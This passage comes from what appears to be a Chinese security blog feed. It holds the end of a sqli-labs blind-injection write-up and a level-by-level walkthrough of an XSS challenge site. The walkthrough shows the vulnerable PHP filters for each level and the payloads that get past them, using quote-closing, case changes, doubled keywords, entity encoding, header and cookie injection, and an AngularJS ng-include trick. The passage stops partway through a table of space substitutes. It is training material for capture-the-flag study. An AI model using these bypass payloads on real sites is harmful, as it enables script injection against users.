<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-62&#x2F;index.php&#x2F;?id&#x3D;1&#39;) and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1) ,1,1))) &gt; 1--+</span><br></pre></td></tr></table></figure>
<p>这里给出sqlmap的结果，注意如果已经运行过一次的话第二次需要清除缓存和cookie</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--flush-session --fresh-queries</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306172703280.png" alt="image-20210306172703280"></p>
<h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>&#39;$id&#39;</code></p>
<h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>(($id))</code></p>
<h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>(&quot;$di&quot;)</code></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a class="link"   href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-44" >SQLI labs 靶场精简学习记录<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<ul>
<li><a class="link"   href="https://www.cnblogs.com/lcamry/" >lcamry 大佬的《MySQL注入天书》<i class="fas fa-external-link-alt"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS 挑战赛</title>
    <url>/2021/03/10/XSS%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="XSS-挑战赛"><a href="#XSS-挑战赛" class="headerlink" title="XSS 挑战赛"></a>XSS 挑战赛</h1><p>地址：<a class="link"   href="http://test.ctf8.com/" >http://test.ctf8.com/<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310153435510.png" alt="image-20210310153435510"></p>
<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310153507626.png" alt="image-20210310153507626"></p>
<p>可以看到URL中的参数name被显示出来，直接把name参数构造为XSS语句即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.ctf8.com&#x2F;level1.php?name&#x3D;&lt;script&gt;alert()&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>


<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310153651773.png" alt="image-20210310153651773"></p>
<p>看上去和 level 1 一样，先测试一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.ctf8.com&#x2F;level2.php?keyword&#x3D;&lt;script&gt;alert()&lt;&#x2F;script&gt;&amp;submit&#x3D;%E6%90%9C%E7%B4%A2</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310154203498.png" alt="image-20210310154203498"></p>
<p>发现没有用猜测是标签被转义解析为文本，再查看input标签，我们输入的语句也在这里的value中显示出来，我们可以尝试从这里进行利用。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310154822757.png" alt="image-20210310154822757"></p>
<p>使用<code>&quot;</code>把value的值进行闭合，再构造onclick事件进行alert()，最后用<code>//</code>把后面的注释掉</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; onclick&#x3D;alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310155118434.png" alt="image-20210310155118434"></p>
<p>这时候我们点击input框就能弹窗</p>
<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310165004936.png" alt="image-20210310165004936"></p>
<p>和level 2 一样尝试下闭合value的值，无果，估计不是双引号闭合的方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;onclick&#x3D;alert(&#39;xss&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310161042357.png" alt="image-20210310161042357"></p>
<p>但是发现把我输入的内容从<code>&#39;</code>处截断了，估计是<code>&#39;</code>闭合方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;onclick&#x3D;alert(&#39;xss&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310161224943.png" alt="image-20210310161224943"></p>
<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310165218833.png" alt="image-20210310165218833"></p>
<p>怎么又换回来<code>&quot;</code>号了？？原来是level 2 没有对<code>&lt;&gt;</code>进行过滤，这里对其进行了过滤，可是我们的payload无需<code>&lt;&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;onclick&#x3D;alert(&#39;xss&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>


<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310165616532.png" alt="image-20210310165616532"></p>
<p>这里在on中间加入了<code>_</code>来阻止我们触发事件，查看下源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = strtolower(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先对keyword变量使用了<code>strtolower()</code>函数转换，把所有字符转换为小写；接着过滤了<code>&lt;script&gt;</code>，并替换为<code>&lt;scr_ipt&gt;</code>；过滤了<code>on</code>并替换为<code>o_n</code>。因为<code>on</code>是很多事件都包含的关键词，所以这里无法直接通过闭合引号在<code>&lt;input&gt;</code>标签中来触发弹窗了，这个可以闭合双引号和标签，然后通过<code>javascript:alert(&#39;XSS&#39;)</code>这种形式来触发弹窗。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;a href&#x3D;javascript:alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310170119900.png" alt="image-20210310170119900"></p>
<p>可以看到在input框的后面多了个链接，点击就能触发XSS。</p>
<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310170353410.png" alt="image-20210310170353410"></p>
<p>这里把<code>herf</code>也过滤了，这样就无法使用<code>javascript:alert()</code>这种方法来弹窗，查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以发现这里少了level 5的<code>strtolower()</code>，因此可以使用大小写绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; Onclick&#x3D;alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br><span class="line">&quot;&gt;&lt;a Href&#x3D;javascript:alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>


<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310170850324.png" alt="image-20210310170850324"></p>
<p>这里把我们的<code>onclick</code>事件的<code>on</code>给过滤了，尝试双写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; oonnclick&#x3D;alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p>回头看看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> =strtolower( <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>果然是把关键词都替换为空格，一般这种情况都能直接双写绕过。</p>
<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310171220610.png" alt="image-20210310171220610"></p>
<p>这里是将你输入的内容变成一个<code>&lt;a&gt;</code>标签的href，尝试使用JavaScript伪协议，发现被类似level 6的加<code>_</code>的方式过滤了，看看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = strtolower(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里的过滤规则在level 7的基础上把<code>strtolower()</code>也加上了，而且在input框里面还使用了<code>htmlspecialchars()</code>对HTML标签进行转义，所以这里肯定是无法利用的。再看<code>&lt;a&gt;</code>标签的里面的href是直接输出，而且没有过滤，直接输出在了双引号<code>&quot;</code>之间，当作字符串处理，利用当作字符串处理的特点，可以直接将我们的payload HTML使用HTML实体字符编码绕过。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javas&amp;#x63;ript:alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310172413293.png" alt="image-20210310172413293"></p>
<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310172611741.png" alt="image-20210310172611741"></p>
<p>看上去和 level 8 差不多，但是尝试使用JavaScript伪协议好像被检测出来说链接不合法，那就先看看源码他是怎么检测的吧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = strtolower(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===strpos(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>原来是在 level 8 的基础上对我们输入的内容查看是否有<code>http://</code>这串字符，有的才输出，否则就说不合法，那好办，直接在payload后面加就行了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javas&amp;#x63;ript:alert(&#39;XSS&#39;) &#x2F;&#x2F;http:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310173121499.png" alt="image-20210310173121499"></p>
<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310173329445.png" alt="image-20210310173329445"></p>
<p>页面上没有能输入的地方，但是在前端页面隐藏了3个输入框，每个都尝试下能不能注入，发现<code>t_sort</code>可以传入参数</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310173551650.png" alt="image-20210310173551650"></p>
<p>那么我们就可以利用这里构造</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.ctf8.com&#x2F;level10.php?t_sort&#x3D;&quot; type&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310175636000.png" alt="image-20210310175636000"></p>
<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310180040882.png" alt="image-20210310180040882"></p>
<p>发现这里多了个<code>t_ref</code>的<code>input</code>标签，而且原来的<code>t_sort</code>似乎被转义了，无法利用，先看看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>由于<code>$str</code>和<code>$str00</code>都使用了<code>htmlspecialchars()</code>函数对其进行转义，因此这里都无法进行利用。再看<code>$str11</code>，它是从<code>$_SERVER[&#39;HTTP_REFERER&#39;]</code>取值，然后直接作为<code>t_ref</code>的值，很明显，我们可以直接构造 <strong>Rfeferer</strong>的值进行XSS攻击。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310180834271.png" alt="image-20210310180834271"></p>
<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310181006919.png" alt="image-20210310181006919"></p>
<p>这一题和 level 11 本质上换汤不换药，从Referer换成了User-Agent即可，这里有个问题就是似乎成功注入之后会直接跳转到别的页面。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310181737224.png" alt="image-20210310181737224"></p>
<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310181903581.png" alt="image-20210310181903581"></p>
<p>和前面两题一样，这次换成从cookie注入了，先抓包，发现<code>t_cook</code>的值是cookie里面的user</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310182122965.png" alt="image-20210310182122965"></p>
<p>那就直接构造cookie的user为我们的payload即可。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310182233505.png" alt="image-20210310182233505"></p>
<h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>网页好像加载出问题了</p>
<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;src&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这题考察<code>Angular JS</code> 的<code>ng-include</code>用法，具体可以参考这篇资料：<a class="link"   href="http://www.runoob.com/angularjs/ng-ng-include.html" >AngularJS ng-include 指令<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。<code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。所以这里就用来包含其他关的页面来触发弹窗。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">level14.php?src&#x3D;&quot;level1.php?name&#x3D;&lt;img src&#x3D;x onerror&#x3D;alert(&#39;XSS&#39;)&gt;&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310203353006.png" alt="image-20210310203353006"></p>
<h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310203631723.png" alt="image-20210310203631723"></p>
<p>只有这一个输出点，看看源码对传入的参数做了什么限制</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = strtolower(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;    &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>.<span class="variable">$str5</span>.<span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里过滤掉了script标签，可以尝试使用其他标签通过事件来弹窗，但是也过滤了空格。</p>
<p>可以使用如下符号替代空格</p>
<table>
<thead>
<tr>
<th align="left">符号</th>
<th align="left">URL编码</th>
</tr>
</thead>
<tbody><tr>
<td align="left">回车(CR)</td>
<td align="left">%0d</td>
</tr>
<tr>
